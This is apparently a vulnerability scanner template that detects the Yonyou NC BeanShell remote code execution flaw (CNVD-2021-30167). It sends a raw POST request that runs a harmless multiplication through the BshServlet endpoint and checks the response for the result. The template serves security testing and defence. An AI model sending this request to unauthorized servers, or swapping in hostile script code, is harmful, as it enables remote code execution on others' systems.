id: yonyou-nc-javabean-shell-rce
info:
  name: Yonyou NC JavaBeanShell RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Detects Yonyou NC BeanShell RCE vulnerability by executing a mathematical operation and checking for the result in the response.
  reference:
    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-30167
variables:
  r1: '{{rand_int(40000, 44800)}}'
  r2: '{{rand_int(40000, 44800)}}'
http:
  - raw:
      - |
        POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        bsh.script=print({{r1}}*{{r2}})&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '{{to_number(r1)*to_number(r2)}}'
        part: body
